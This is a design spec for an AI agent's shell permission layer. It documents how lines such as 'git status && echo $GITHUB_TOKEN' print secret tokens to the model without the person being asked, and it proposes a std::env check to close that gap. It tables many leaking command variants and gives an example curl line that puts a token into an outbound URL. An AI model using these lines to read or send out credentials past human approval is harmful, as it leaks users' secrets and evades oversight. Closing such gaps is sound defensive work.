# safeBash: a variable in an `echo` asks `std::env` (ADI-356)

## The problem

`safeBash` lets an `echo` print an environment variable without asking
anyone. This line asks only the git question:

```
git status && echo $GITHUB_TOKEN
```

The `recommended` policy approves the git read, so nothing reaches the
person. Bash then prints the token and the model reads it. The `env` tool
asks `std::env` before it reads the same variable, so the shell is a way
around that question.

## Where the leak is, measured

I planned 43 lines that carry a variable, each after `git status` so the
line has a question of its own. Twenty-eight ask `std::bash`, which shows
the person the whole line. The ones that stay narrow are:

| Line | Asks today | Leaks? |
| --- | --- | --- |
| `git status && echo $GITHUB_TOKEN` | `std::git::status` | yes |
| `git status && echo "token: $GITHUB_TOKEN"` | `std::git::status` | yes |
| `git status && echo pre$GITHUB_TOKEN` | `std::git::status` | yes |
| `git status && echo $GITHUB_TOKEN > out.txt` | `std::git::status`, `std::write` | yes, into a file |
| `git status; (echo $TOKEN)` | `std::git::status` | yes |
| `git status; echo $TOKEN \| cat` | `std::git::status` | yes |
| `git status; timeout 5 echo $TOKEN` | `std::git::status` | yes |
| `git status && true $GITHUB_TOKEN`, `: $GITHUB_TOKEN` | `std::git::status` | no, they print nothing |
| `git status; printenv GITHUB_TOKEN` | `std::git::status`, `std::exec` | covered by `std::exec` |
| `git status; echo $?`, `echo $RANDOM`, `echo $1` | `std::git::status` | no, not from the environment |

So the leak is `echo`, in every position it can take. `printf` already
refuses a variable argument. Every other command with a variable in its
words (`cat $F`, `ls $D`, `git log $REV`, `git commit -m "$MSG"`, `pnpm
test $FLAGS`, `X=$TOKEN pnpm test`) asks `std::bash` today.

A line that is only `echo $HOME` is not a leak either. It has no question
of its own, so it asks `std::bash`.

## The rule

A narrow line asks `std::env { name }` once for each environment variable
that a word of it expands.

```
git status && echo $GITHUB_TOKEN
```

asks `std::git::status` and `std::env { name: "GITHUB_TOKEN" }`. This is
the question the `env` tool asks, so one policy rule covers both ways of
reading a variable.

The details:

- **Where a variable counts.** Anywhere in a word: alone (`$X`), inside
  double quotes (`"token: $X"`), or joined to other text (`pre$X`).
- **One question per name.** `echo $A $A $B` asks for `A` and `B`.
- **The rule is not about `echo`.** It applies to every word of a narrow
  line, so `true $X` and `: $X` ask too, although they print nothing. A
  rule that names `echo` would have to be extended by hand for each
  command that later accepts a variable. These two lines are rare, and I
  found neither in the logs.
- **Names bash computes itself ask nothing.** `$?`, `$0` to `$9`,
  `$RANDOM`, and `$SECONDS` hold nothing from the environment. The parser
  rejects `$$` and `$#`, so those lines ask `std::bash`.
- **A program's words get the same question.** A variable in a program's
  words asks `std::bash` today. If the exec rule later accepts one
  (`pnpm test $FLAGS`), the line asks `std::env` for it as well as
  `std::exec`, because approving `curl` is not approving
  `curl https://example.com/?t=$GITHUB_TOKEN`. (Changed in review: the
  first version of this spec skipped the question for such a command.)
- **The step runner needs no change.** The question is one more effect of
  its step, so it is asked up front with the others, and the plan made
  just before the step asks it again and matches.

## A line that is only an `echo`

`echo $HOME` alone asks `std::bash` today, because it has no question of
its own. Under the rule it has one, `std::env { name: "HOME" }`, so it
becomes a narrow line. The person sees a smaller and more exact question,
and with the policy change below it asks nothing at all.

## What `recommended` approves

`recommended` approves `std::env` for names that hold no secret:

```
HOME  PWD  USER  LOGNAME  SHELL  TERM  LANG  TMPDIR  PATH  HOSTNAME
```

Every other name reaches the person. The rule matches on the effect, so
it also approves `env("HOME")` from the `env` tool, which asks today.
That is the same read by another route, so I think it should get the same
answer.

`minimal` is unchanged: it approves nothing here.

## What the person sees

For `git status && echo $GITHUB_TOKEN` under `recommended`, one question:

```
Let a shell command read the environment variable `GITHUB_TOKEN`? `git status && echo $GITHUB_TOKEN`
  name: GITHUB_TOKEN
```

The `std::env` payload is `{ name }` and has no field for the command. I
propose leaving the effect as it is and putting the command in the
message text, because adding a field would change the effect for every
program that handles `std::env`.

## Lines whose question changes

| Line | Before | After |
| --- | --- | --- |
| `git status && echo $GITHUB_TOKEN` | `std::git::status` | `std::git::status`, `std::env` |
| `pnpm test; echo "home: $HOME"` | `std::exec` | `std::exec`, `std::env` (approved by `recommended`) |
| `echo $HOME` | `std::bash` | `std::env` (approved by `recommended`) |
| `echo $GITHUB_TOKEN` | `std::bash` | `std::env` |
| `git status && echo $TOKEN > out.txt` | `std::git::status`, `std::write` | the same, and `std::env` |
| `git status; echo $?` | `std::git::status` | unchanged |

## What this does not close

- A program can still print any variable. `printenv GITHUB_TOKEN` asks
  `std::exec`, which shows the person the command, and that is the
  question for it.
- A value already in a file, or one a person approved once and the model
  then repeats, is outside this rule.

## Size

About a day: one function that collects the variable names of a line's
words, one arm in `raiseOne`, the `recommended` rule, tests in
`tests/agency/safeBash.agency`, and a section in
`docs/dev/stdlib/safe-bash.md`. One pull request.

## Decisions for the owner

1. **The harmless list.** The ten names above. Add or remove any.
2. **`env("HOME")` from the `env` tool is approved by `recommended` too.**
   I recommend yes, because one rule on the effect covers both routes. The
   other choice is a separate effect for the shell, which is a second
   concept for the same read.
3. **`true $X` and `: $X` ask.** I recommend yes, for the reason under
   "The rule is not about `echo`".
4. **The command goes in the message, not the payload.** I recommend
   yes.
